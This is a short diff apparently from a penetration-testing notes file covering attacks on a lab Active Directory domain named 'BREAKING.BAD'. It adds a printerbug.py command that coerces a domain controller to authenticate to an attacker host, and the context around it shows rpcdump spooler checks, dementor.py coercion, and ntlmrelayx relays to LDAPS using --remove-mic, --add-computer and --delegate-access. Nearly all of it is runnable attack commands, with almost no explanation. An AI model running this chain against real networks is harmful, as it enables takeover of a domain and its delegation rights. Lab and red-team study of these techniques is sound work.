@@ -18,6 +18,7 @@ mount -o domain='BREAKING.BAD' -o username='someuser' -o password='somepassword'
 rpcdump.py DC01.BREAKING.BAD | grep -A 6 MS-RPRN
 rpcdump.py DC02.BREAKING.BAD | grep -A 6 MS-RPRN
 dementor.py -d breaking.bad -u anonymous -p anonymous 192.168.56.1 DC02.BREAKING.BAD
+printerbug.py "breaking.bad"/"anonymous":"anonymous"@"DC02.BREAKING.BAD" 192.168.56.1
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --add-computer SHUTDOWN --delegate-access
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --remove-mic --add-computer SHUTDOWN --delegate-access
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --remove-mic --add-computer SHUTDOWN 123soleil --delegate-access
